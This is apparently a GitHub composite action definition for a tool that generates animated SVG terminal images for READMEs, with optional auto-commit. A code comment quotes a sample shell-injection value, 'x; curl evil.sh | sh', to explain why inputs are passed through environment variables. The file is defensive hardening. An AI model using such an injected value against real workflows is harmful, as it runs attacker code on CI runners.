name: 'SVG Terminal Generator'
description: 'Generate animated SVG terminals for GitHub READMEs from a declarative YAML config.'
author: 'williamzujkowski'

branding:
  icon: 'terminal'
  color: 'purple'

inputs:
  config:
    description: 'Path to terminal.yml config file'
    required: false
    default: 'terminal.yml'
  output:
    description: 'Output SVG file path'
    required: false
    default: 'terminal.svg'
  cache-mode:
    description: 'Dynamic-block cache behavior: normal | refresh | frozen | off'
    required: false
    default: 'normal'
  static:
    description: 'Generate a non-animated SVG (final-frame snapshot)'
    required: false
    default: 'false'
  minify:
    description: 'Strip inter-element whitespace from the output'
    required: false
    default: 'false'
  commit:
    description: 'Auto-commit the generated SVG'
    required: false
    default: 'false'
  commit-message:
    description: 'Commit message when auto-committing'
    required: false
    default: 'chore: update terminal SVG [skip ci]'

outputs:
  svg-path:
    description: 'Path to the generated SVG file'
    value: ${{ inputs.output }}
  svg-size:
    description: 'Size of the generated SVG in bytes'
    value: ${{ steps.generate.outputs.size }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '22'
        cache: 'npm'

    - name: Install svg-terminal
      shell: bash
      run: npm install -g svg-terminal

    - name: Generate SVG
      id: generate
      shell: bash
      env:
        # Pass user inputs via env so they never go through shell template
        # expansion (closes M1 — without this, a value like
        # `config: 'x; curl evil.sh | sh'` would execute on the runner).
        TZ: ${{ env.TZ || 'UTC' }}
        INPUT_CONFIG: ${{ inputs.config }}
        INPUT_OUTPUT: ${{ inputs.output }}
        INPUT_CACHE_MODE: ${{ inputs.cache-mode }}
        INPUT_STATIC: ${{ inputs.static }}
        INPUT_MINIFY: ${{ inputs.minify }}
      run: |
        set -euo pipefail
        # Compose the optional flags into a single $args string. Empty by default;
        # only adds the flag when the input was set to a non-default value.
        args=""
        case "$INPUT_CACHE_MODE" in
          refresh) args="$args --refresh-cache" ;;
          frozen)  args="$args --frozen-cache" ;;
          off)     args="$args --no-cache" ;;
          normal|"") : ;;
          *) echo "::error::Unknown cache-mode '$INPUT_CACHE_MODE'"; exit 1 ;;
        esac
        if [ "$INPUT_STATIC" = "true" ]; then args="$args --static"; fi
        if [ "$INPUT_MINIFY" = "true" ]; then args="$args --minify"; fi
        svg-terminal generate --config "$INPUT_CONFIG" --output "$INPUT_OUTPUT" $args
        echo "size=$(stat -c%s "$INPUT_OUTPUT" 2>/dev/null || stat -f%z "$INPUT_OUTPUT")" >> "$GITHUB_OUTPUT"

    - name: Commit SVG
      if: inputs.commit == 'true'
      shell: bash
      env:
        INPUT_OUTPUT: ${{ inputs.output }}
        INPUT_COMMIT_MESSAGE: ${{ inputs.commit-message }}
      run: |
        # Inputs passed via env so commit-message can never break out of the
        # `git commit -m "..."` quoting (closes M1).
        git config --local user.email "github-actions[bot]@users.noreply.github.com"
        git config --local user.name "github-actions[bot]"
        git add "$INPUT_OUTPUT"
        git diff --staged --quiet || git commit -m "$INPUT_COMMIT_MESSAGE"
        git push
